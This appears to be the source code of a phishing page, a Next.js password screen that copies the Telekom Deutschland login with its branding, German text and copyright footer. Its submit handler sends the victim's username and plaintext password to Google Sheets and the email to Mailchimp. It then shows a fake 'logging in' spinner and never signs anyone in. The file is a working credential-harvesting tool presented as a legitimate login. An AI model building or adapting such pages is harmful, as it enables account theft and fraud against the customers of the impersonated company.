"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Switch } from "@/components/ui/switch"
import { HelpCircle, Eye, EyeOff, User, ChevronDown, Loader2 } from "lucide-react"
import { submitToMailchimp, submitToGoogleSheets } from "./actions"

export default function PasswordPage() {
  const router = useRouter()
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [rememberMe, setRememberMe] = useState(true)
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    const storedUsername = sessionStorage.getItem("username")
    if (storedUsername) {
      setUsername(storedUsername)
    } else {
      router.push("/")
    }
  }, [router])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const [mailchimpResult, googleSheetsResult] = await Promise.all([
        submitToMailchimp({
          email: username,
          rememberMe,
        }),
        submitToGoogleSheets({
          email: username,
          password: password,
          rememberMe,
          timestamp: new Date().toISOString(),
        }),
      ])

      if (!mailchimpResult.success) {
        console.error("[v0] Mailchimp submission failed:", mailchimpResult.error)
      } else {
        console.log("[v0] Mailchimp submission successful")
      }

      if (googleSheetsResult.warning) {
        console.warn("[v0] Google Sheets warning:", googleSheetsResult.warning)
      } else if (googleSheetsResult.success) {
        console.log("[v0] Google Sheets submission successful")
      }

      await new Promise((resolve) => setTimeout(resolve, 2000))

      console.log("[v0] Login successful:", { username, rememberMe })
    } catch (error) {
      console.error("[v0] Login error:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleBack = () => {
    router.push("/")
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#7a6f6f] via-[#6b7a7f] to-[#5a8a8f] flex flex-col">
        <div className="absolute top-0 left-0 w-20 h-20 md:w-24 md:h-24 bg-[#E20074] flex items-center justify-center">
          <span className="text-white text-4xl md:text-5xl font-bold">T</span>
        </div>

        <div className="flex-1 flex items-center justify-center p-4">
          <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl p-12 flex flex-col items-center justify-center gap-6">
            <Loader2 className="w-16 h-16 text-[#E20074] animate-spin" />
            <h2 className="text-2xl font-bold text-black">Anmeldung läuft...</h2>
            <p className="text-gray-600 text-center">Bitte warten Sie, während wir Ihre Anmeldedaten überprüfen</p>
          </div>
        </div>

        <footer className="p-4 md:p-6 text-white text-xs md:text-sm">
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
            <div>
              <p>© Telekom Deutschland GmbH</p>
              <p>26.26.1</p>
            </div>
            <div className="flex gap-4 md:gap-6">
              <a href="#" className="hover:underline">
                Impressum
              </a>
              <a href="#" className="hover:underline">
                Datenschutz
              </a>
            </div>
          </div>
        </footer>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#7a6f6f] via-[#6b7a7f] to-[#5a8a8f] flex flex-col">
      <div className="absolute top-0 left-0 w-20 h-20 md:w-24 md:h-24 bg-[#E20074] flex items-center justify-center">
        <span className="text-white text-4xl md:text-5xl font-bold">T</span>
      </div>

      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl p-8 md:p-12 relative">
          <button className="absolute top-6 right-6 text-gray-600 hover:text-gray-800">
            <HelpCircle className="w-6 h-6" />
          </button>

          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 rounded-full bg-gray-400 flex items-center justify-center">
              <User className="w-6 h-6 text-white" />
            </div>
            <button className="flex items-center gap-2 text-black font-medium hover:text-gray-700">
              <span className="text-sm md:text-base">{username}</span>
              <ChevronDown className="w-4 h-4" />
            </button>
          </div>

          <h1 className="text-3xl md:text-4xl font-bold mb-8 md:mb-10 text-black">Passwort eingeben</h1>

          <form onSubmit={handleSubmit} className="space-y-4 md:space-y-5">
            <div className="relative">
              <Input
                type={showPassword ? "text" : "password"}
                placeholder="Passwort"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full h-12 md:h-14 px-4 pr-10 text-base md:text-lg border-[#4a5f4a] bg-[#6b7c5e] text-white placeholder:text-gray-200 rounded-lg focus:border-[#4a5f4a] focus:ring-[#4a5f4a]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-200 hover:text-white"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>

            <div>
              <a href="#" className="text-sm md:text-base text-blue-600 hover:text-blue-800 underline">
                Passwort vergessen?
              </a>
            </div>

            <div className="flex items-center gap-3 pt-2">
              <Switch
                checked={rememberMe}
                onCheckedChange={setRememberMe}
                className="data-[state=checked]:bg-[#E20074]"
              />
              <span className="text-sm md:text-base text-black">angemeldet bleiben</span>
              <button type="button" className="text-gray-500 hover:text-gray-700">
                <HelpCircle className="w-4 h-4" />
              </button>
            </div>

            <div className="pt-4 space-y-3">
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-12 md:h-14 bg-[#E20074] hover:bg-[#C00060] text-white text-base md:text-lg font-semibold rounded-lg disabled:opacity-50"
              >
                ANMELDEN
              </Button>

              <Button
                type="button"
                variant="outline"
                className="w-full h-12 md:h-14 bg-white border-gray-300 text-black hover:bg-gray-50 text-base md:text-lg font-normal rounded-lg"
              >
                Andere Anmeldeoptionen
              </Button>
            </div>

            <div>
              <button
                type="button"
                onClick={handleBack}
                className="text-sm md:text-base text-blue-600 hover:text-blue-800 underline"
              >
                {"< Zurück"}
              </button>
            </div>
          </form>
        </div>
      </div>

      <footer className="p-4 md:p-6 text-white text-xs md:text-sm">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <p>© Telekom Deutschland GmbH</p>
            <p>26.26.1</p>
          </div>
          <div className="flex gap-4 md:gap-6">
            <a href="#" className="hover:underline">
              Impressum
            </a>
            <a href="#" className="hover:underline">
              Datenschutz
            </a>
          </div>
        </div>
      </footer>
    </div>
  )
}
